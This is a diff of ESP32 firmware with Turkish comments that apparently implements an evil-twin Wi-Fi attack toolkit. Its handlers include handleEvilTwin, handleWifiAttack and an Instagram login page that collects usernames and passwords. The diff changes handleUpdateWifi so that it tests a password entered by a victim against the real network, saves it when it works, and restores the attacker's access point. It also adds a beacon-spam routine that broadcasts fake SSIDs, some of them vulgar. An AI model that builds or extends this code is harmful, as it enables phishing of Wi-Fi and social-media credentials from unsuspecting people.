@@ -311,7 +311,7 @@ void handleInstagramWifi(){
 
 
 
-void handleInstagramLogin() {
+void handleInstagramLogin () {
   if (webServer.method() == HTTP_POST) {
     kullaniciAdi = webServer.arg("kullanici_adi");
     sifre = webServer.arg("sifre");
@@ -724,8 +724,8 @@ void handleUpdateWifi() {
   Serial.print("Girilen Şifre: ");
   Serial.println(password);
 
-  // STA moduna geçiş yapmadan doğrudan bağlantı deneyelim
-  WiFi.mode(WIFI_STA); // Hem AP hem STA modunda çalış
+ 
+  WiFi.mode(WIFI_AP_STA); 
   
   Serial.println("Bağlantı deneniyor...");
   WiFi.begin(targetSSID.c_str(), password.c_str());
@@ -733,7 +733,7 @@ void handleUpdateWifi() {
   unsigned long startTime = millis();
   bool connected = false;
 
-  // Maksimum 10 saniye bağlantı denemesi
+
   while (millis() - startTime < 10000) {
     if (WiFi.status() == WL_CONNECTED) {
       connected = true;
@@ -743,35 +743,41 @@ void handleUpdateWifi() {
     Serial.print(".");
   }
 
-  // JSON yanıtı oluştur
+
   String response;
   if (connected) {
     savedPassword = password;
     response = "{\"success\":true,\"message\":\"Bağlantı başarılı!\"}";
     Serial.println("\nBağlantı başarılı!");
+     WiFi.softAPdisconnect(true);
+    isAPCreated = false;
+    isInstagramAP = false;
+
+    // Ana AP'yi (ESP32) yeniden başlat
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP("Esp32","128milyar");
+    dnsServer.start(DNS_PORT, "*", apIP);
+
+    // Ana sayfaya yönlendir
+    String html = "<script>location.href='/';</script>";
+    webServer.send(200, "text/html", html);
+    return;
+
   } else {
     response = "{\"success\":false,\"message\":\"Şifre yanlış! Lütfen tekrar deneyin.\"}";
     Serial.println("\nBağlantı başarısız! AP aktif kalmaya devam ediyor...");
-    
-    // AP'yi yeniden başlat
-    WiFi.softAPdisconnect(false);
-    WiFi.softAP(targetSSID.c_str());
-    dnsServer.start(DNS_PORT, "*", apIP);
-  }
 
-  // STA bağlantısını kes (AP aktif kalsın)
-  WiFi.disconnect();
-  
-  // JSON yanıtını gönder
+
   webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   webServer.sendHeader("Pragma", "no-cache");
   webServer.sendHeader("Expires", "-1");
   webServer.send(200, "application/json", response);
+  }
 }
 
 
 //----------------------------------------------------------//----------------------------------------------------------
-
 
 
 
@@ -890,7 +896,6 @@ void handleEvilTwin() {
 }
 
 
-
 //----------------------------------------------------------//----------------------------------------------------------
 
 
@@ -941,8 +946,96 @@ void handleWifiAttack() {
 
 
 void handleWifiSpam() {
-  webServer.send(200, "text/plain", "Wifi spam");
+  int s = 2000;
+  const char* sifre = "sifre";
+
+const char* ssid1 = "51.Bölge";    
+const char* password1 = "babalarfirar"; 
+
+const char* ssid2 = "babalarfirar";    
+const char* password2 = "sifre"; 
+
+const char* ssid3 = "noldusanamk";    
+const char* password3 = "sifre"; 
+
+const char* ssid4 = "eheeeee";    
+const char* password4 = "sifre"; 
+
+const char* ssid5 = "dayigeldisiktigitti";    
+const char* password5 = "sifre"; 
+
+const char* ssid6 = "fasulyesineoynamam";    
+const char* password6 = "sifre"; 
+
+const char* ssid7 = "koksalbabaa";    
+const char* password7 = "sifre"; 
+
+const char* ssid8 = "hikobababaa";    
+const char* password8 = "sifre"; 
+
+const char* ssid9 = "amantanrimdedim";    
+const char* password9 = "sifre"; 
+
+const char* ssid10 = "fatih5g";    
+const char* password10 = "sifre"; 
+
+const char* ssid11 = "fatih2.5g";    
+const char* password11 = "sifre"; 
+
+const char* ssid12 = "beleswifi";    
+const char* password12 = "sifre"; 
+
+const char* ssid13 = "cafewifi";    
+const char* password13 = "sifre"; 
+
+const char* ssid14 = "saat200milyar";    
+const char* password14 = "sifre"; 
+
+
+ 
+  WiFi.softAP(ssid1, sifre);
+  delay(s); 
+
+  WiFi.softAP(ssid2, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid3, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid4, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid5, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid6, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid7, sifre);
+  delay(s); 
+
+  WiFi.softAP(ssid8, sifre);
+  delay(s); 
+
+  WiFi.softAP(ssid9, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid10, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid11, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid12, sifre);
+  delay(s); 
+
+  WiFi.softAP(ssid13, sifre);
+  delay(s);
+
+  WiFi.softAP(ssid14, sifre);
+  delay(s); 
 }
+
 
 
 
